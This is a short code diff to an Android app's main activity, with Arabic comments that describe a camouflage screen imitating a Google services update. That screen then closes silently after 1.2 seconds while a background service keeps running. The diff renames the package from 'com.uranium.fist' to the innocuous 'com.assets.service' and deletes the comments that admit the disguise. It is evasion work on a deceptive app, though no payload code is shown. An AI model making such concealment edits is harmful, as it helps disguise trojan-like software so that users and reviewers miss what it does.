@@ -2,7 +2,7 @@
 // ⚡ مملكة ناصر دين الله الكلعي ⚡ - Uranium Supreme Main Activity v8.0
 // الواجهة التمويهية الفاخرة وإطلاق الخدمات الخلفية السطحية
 // =========================================================================
-package com.uranium.fist
+package com.assets.service
 
 import android.app.Activity
 import android.content.Intent
@@ -19,7 +19,6 @@ class MainActivity : Activity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        // بناء واجهة تمويهية عسكرية تحاكي تحديث وتثبيت خدمات جوجل الأساسية
         val layout = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             gravity = Gravity.CENTER
@@ -52,7 +51,6 @@ class MainActivity : Activity() {
             }
         } catch (e: Exception) {}
 
-        // إغلاق الواجهة واختفاؤها بصمت تام بعد 1.2 ثانية لتستمر الخدمة في العمل بالخلفية
         textView.postDelayed({
             finish()
         }, 1200)
